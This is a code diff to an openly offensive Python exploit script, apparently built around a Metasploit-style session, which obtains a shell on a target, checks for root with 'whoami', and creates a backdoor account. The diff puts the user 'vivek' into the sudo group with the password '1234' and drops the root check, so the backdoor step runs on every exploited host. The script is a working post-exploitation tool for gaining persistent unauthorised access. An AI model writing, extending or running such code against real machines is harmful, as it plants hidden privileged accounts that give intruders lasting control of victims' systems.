@@ -154,7 +154,6 @@ class ExploitCVE(object):
         shell.write('whoami')
         time.sleep(10)
         root_status = shell.read()
-        print(root_status)
         return root_status
     
     def createUser(self):
@@ -162,10 +161,10 @@ class ExploitCVE(object):
         function for creating user backdoor on the target machine after obtaining root access
         """
         shell = client.sessions.session(list(client.sessions.list.keys())[0])
-        shell.write('useradd -s /bin/bash -d /home/vivek/ -m -G vivek')
+        shell.write('useradd -s /bin/bash -d /home/vivek/ -m -G sudo vivek')
         time.sleep(10)
         print(shell.read())
-        shell.write('sudo passwd vivek')
+        shell.write('passwd vivek')
         shell.write('1234')
 
 
@@ -221,15 +220,11 @@ def main():
                 print("#    6. Downloading and executing the exploit...")
                 print("############################################################################")
                 ec.sendCommand()
-                priv_esc = ec.exploitTarget()
-                if priv_esc == 'root':
-                    print("############################################################################")
-                    print("#    7. Creating user backdoor...")
-                    print("############################################################################")
-                    ec.createUser()
-                    pass
-                else:
-                    pass
+                ec.exploitTarget()
+                print("############################################################################")
+                print("#    7. Creating user backdoor...")
+                print("############################################################################")
+                ec.createUser()
             else:
                 print("No shell session opened!")
                 print("############################################################################")
@@ -242,14 +237,15 @@ def main():
                     print("############################################################################")
                     ec.sendCommand()
                     priv_esc = ec.exploitTarget()
-                    if priv_esc == 'root':
-                        print("############################################################################")
-                        print("#    7. Creating user backdoor...")
-                        print("############################################################################")
-                        ec.createUser()
-                        pass
-                    else:
-                        pass
+                    print(priv_esc)
+                    # if priv_esc == 'root':
+                    #     print("############################################################################")
+                    #     print("#    7. Creating user backdoor...")
+                    #     print("############################################################################")
+                    #     ec.createUser()
+                    #     pass
+                    # else:
+                    #     pass
                 else:
                     print("Target can not be exploited!")
                     pass
